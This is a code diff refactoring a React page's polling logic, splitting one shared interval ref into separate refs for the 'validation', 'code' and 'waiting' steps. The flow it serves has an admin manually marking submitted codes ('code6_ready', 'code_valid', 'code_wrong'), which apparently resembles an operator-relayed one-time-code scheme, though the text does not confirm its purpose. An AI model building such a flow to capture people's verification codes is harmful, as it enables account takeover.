@@ -28,7 +28,9 @@ export default function Home() {
   const [loading, setLoading] = useState(false);
   const [submittedData, setSubmittedData] = useState(null);
   const [submissionId, setSubmissionId] = useState(getParams().get("id") || null);
-  const pollingRef = useRef(null);
+  const pollingValidationRef = useRef(null);
+  const pollingCodeRef = useRef(null);
+  const pollingWaitingRef = useRef(null);
   const [showStatusCheck, setShowStatusCheck] = useState(false);
   const [showFAQ, setShowFAQ] = useState(false);
   const [adminInactive, setAdminInactive] = useState(false);
@@ -76,77 +78,47 @@ export default function Home() {
     }
   }, []);
 
-  // Poll every 3s when on "validation" step (waiting for code_ready)
+  // Poll on "validation" step
   useEffect(() => {
-    if (step === "validation" && submissionId) {
-      pollingRef.current = setInterval(async () => {
-        // Check admin status
-        const adminRes = await base44.functions.invoke("checkAdminStatus", {});
-        setAdminInactive(adminRes?.data?.is_inactive || false);
-
-        const res = await base44.functions.invoke("checkStatus", { submissionId });
-        const s = res?.data?.status;
-        if (s === "code_ready") {
-          clearInterval(pollingRef.current);
-          setStep("code");
-        } else if (s === "code6_ready") {
-          clearInterval(pollingRef.current);
-          setStep("code6");
-        } else if (s === "code_wrong" || s === "code_expired") {
-          clearInterval(pollingRef.current);
-          setStep("wrong");
-        } else if (s === "waiting_queue") {
-          clearInterval(pollingRef.current);
-          setStep("queue");
-        }
-      }, 1500);
-    }
-    return () => clearInterval(pollingRef.current);
+    if (step !== "validation" || !submissionId) return;
+    pollingValidationRef.current = setInterval(async () => {
+      const adminRes = await base44.functions.invoke("checkAdminStatus", {});
+      setAdminInactive(adminRes?.data?.is_inactive || false);
+      const res = await base44.functions.invoke("checkStatus", { submissionId });
+      const s = res?.data?.status;
+      if (s === "code_ready") { clearInterval(pollingValidationRef.current); setStep("code"); }
+      else if (s === "code6_ready") { clearInterval(pollingValidationRef.current); setStep("code6"); }
+      else if (s === "code_wrong" || s === "code_expired") { clearInterval(pollingValidationRef.current); setStep("wrong"); }
+      else if (s === "waiting_queue") { clearInterval(pollingValidationRef.current); setStep("queue"); }
+    }, 1500);
+    return () => clearInterval(pollingValidationRef.current);
   }, [step, submissionId]);
 
-  // Poll when on "code" step in case admin switches to code6
+  // Poll on "code" step in case admin switches to code6
   useEffect(() => {
-    if (step === "code" && submissionId) {
-      pollingRef.current = setInterval(async () => {
-        const res = await base44.functions.invoke("checkStatus", { submissionId });
-        const s = res?.data?.status;
-        if (s === "code6_ready") {
-          clearInterval(pollingRef.current);
-          setStep("code6");
-        }
-      }, 2000);
-    }
-    return () => clearInterval(pollingRef.current);
+    if (step !== "code" || !submissionId) return;
+    pollingCodeRef.current = setInterval(async () => {
+      const res = await base44.functions.invoke("checkStatus", { submissionId });
+      const s = res?.data?.status;
+      if (s === "code6_ready") { clearInterval(pollingCodeRef.current); setStep("code6"); }
+    }, 2000);
+    return () => clearInterval(pollingCodeRef.current);
   }, [step, submissionId]);
 
-  // Poll every 3s when on "waiting" step (waiting for admin decision on code)
+  // Poll on "waiting" step
   useEffect(() => {
-    if (step === "waiting" && submissionId) {
-      pollingRef.current = setInterval(async () => {
-        const res = await base44.functions.invoke("checkStatus", { submissionId });
-        const s = res?.data?.status;
-        if (s === "code_valid") {
-          clearInterval(pollingRef.current);
-          setStep("verified");
-        } else if (s === "code_ready") {
-          clearInterval(pollingRef.current);
-          setStep("code");
-        } else if (s === "code6_ready") {
-          clearInterval(pollingRef.current);
-          setStep("code6");
-        } else if (s === "code_wrong") {
-          clearInterval(pollingRef.current);
-          setStep("wrong");
-        } else if (s === "code_expired") {
-          clearInterval(pollingRef.current);
-          setStep("expired");
-        } else if (s === "waiting_queue") {
-          clearInterval(pollingRef.current);
-          setStep("queue");
-        }
-      }, 1500);
-    }
-    return () => clearInterval(pollingRef.current);
+    if (step !== "waiting" || !submissionId) return;
+    pollingWaitingRef.current = setInterval(async () => {
+      const res = await base44.functions.invoke("checkStatus", { submissionId });
+      const s = res?.data?.status;
+      if (s === "code_valid") { clearInterval(pollingWaitingRef.current); setStep("verified"); }
+      else if (s === "code_ready") { clearInterval(pollingWaitingRef.current); setStep("code"); }
+      else if (s === "code6_ready") { clearInterval(pollingWaitingRef.current); setStep("code6"); }
+      else if (s === "code_wrong") { clearInterval(pollingWaitingRef.current); setStep("wrong"); }
+      else if (s === "code_expired") { clearInterval(pollingWaitingRef.current); setStep("expired"); }
+      else if (s === "waiting_queue") { clearInterval(pollingWaitingRef.current); setStep("queue"); }
+    }, 1500);
+    return () => clearInterval(pollingWaitingRef.current);
   }, [step, submissionId]);
 
   const handleSubmit = async (data) => {
